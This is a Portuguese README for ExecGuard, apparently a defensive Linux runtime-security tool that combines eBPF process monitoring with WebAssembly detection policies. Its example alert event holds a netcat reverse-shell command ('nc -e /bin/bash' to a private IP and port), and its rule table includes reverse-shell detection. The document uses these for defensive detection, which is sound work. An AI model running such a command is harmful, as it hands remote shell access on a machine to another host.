ExecGuard

Runtime Security Pipeline combinando eBPF para observabilidade kernel-level e WebAssembly (WASM) para execução segura de políticas em tempo real.

Visão Geral

ExecGuard demonstra uma arquitetura moderna para detecção de comportamento suspeito em sistemas Linux.

O pipeline captura eventos de execução de processos através de eBPF, processa os eventos em userspace utilizando Rust e aplica políticas de segurança isoladas em módulos WebAssembly.

Objetivos
Captura de eventos execve em nível de kernel
Pipeline extensível baseado em WASM
Isolamento seguro das regras de detecção
Baixa latência por evento
Hot-swap de políticas sem recompilar o agente
Arquitetura
┌────────────────────┐
│     Linux Kernel   │
│     Tracepoints    │
└─────────┬──────────┘
          │
          ▼
┌────────────────────┐
│     eBPF Probe     │
│       (Aya)        │
└─────────┬──────────┘
          │
          ▼
┌────────────────────┐
│   Rust Loader      │
│ Async Event Stream │
└─────────┬──────────┘
          │
          ▼
┌────────────────────┐
│   WASM Runtime     │
│    (Wasmtime)      │
└─────────┬──────────┘
          │
          ▼
┌────────────────────┐
│ Policy Evaluation  │
│ Risk Scoring       │
│ Correlation        │
└─────────┬──────────┘
          │
          ▼
┌────────────────────┐
│ JSON Alerts        │
│ Security Events    │
└────────────────────┘
Componentes
execguard/
├── execguard-agent/
│   ├── src/
│   └── execguard.wasm
│
├── execguard-wasm/
│   └── src/
│
├── execguard-ebpf-real/
│   ├── execguard-ebpf/
│   ├── execguard-common/
│   └── src/
│
├── scripts/
│   ├── build.sh
│   └── test.sh
│
└── docs/
    └── LIMITACAO_WSL.md
Pipeline de Processamento
Event
  │
  ▼
Enrichment
  │
  ▼
Correlation
  │
  ▼
Policy Evaluation
  │
  ▼
Risk Scoring
  │
  ▼
Alert Generation
Regras Implementadas
Regra	Severidade	Descrição
BANNED_BINARY	10	Execução de binários proibidos
TMP_EXECUTION	7	Execução em /tmp
COMM_MISMATCH	5	Processo difere do executável
REVERSE_SHELL	9	Indicadores de shell reversa
Exemplo de Evento
{
  "pid": 1234,
  "uid": 1000,
  "comm": "bash",
  "file": "/tmp/nc -e /bin/bash 192.168.1.100 4444",
  "risk_score": 10
}
Performance
Métrica	Valor
Latência WASM	50–130 µs
Throughput	> 10k eventos/s
Heap WASM	64 KB
Binário WASM	~15 KB
Stack Tecnológica
Tecnologia	Papel
Rust	Runtime principal
eBPF	Captura kernel-level
Aya	Framework eBPF
WebAssembly	Sandbox de políticas
Wasmtime	Runtime WASM
Tokio	Processamento assíncrono
Serde	Serialização
Quick Start
Build
git clone https://github.com/seu-usuario/execguard.git

cd execguard

./scripts/build.sh
Executar Simulação
cd execguard-agent

cargo run --release
Status do Projeto
Componente	Status
WASM Policy Engine	✅
Runtime Wasmtime	✅
Event Simulation	✅
eBPF Probe Build	✅
Aya Loader Build	✅
Pipeline eBPF → WASM	⚠️ Linux Nativo
Produção Linux	🔄
Limitações Conhecidas

O ambiente WSL2 não fornece suporte completo para tracepoints e recursos necessários ao runtime eBPF.

O projeto foi validado em modo de simulação e requer Linux nativo para execução completa do pipeline kernel → userspace → WASM.

Detalhes em:

docs/LIMITACAO_WSL.md
Roadmap
Runtime
 Pipeline eBPF → WASM completo
 Hot Reload de módulos WASM
 Policy Registry
Correlação
 RocksDB State Store
 Correlation Engine
 Session Tracking
Observabilidade
 Prometheus Metrics
 OpenTelemetry
 Grafana Dashboards
Segurança
 Threat Intelligence Feeds
 IOC Matching
 YARA Integration
Licença

MIT

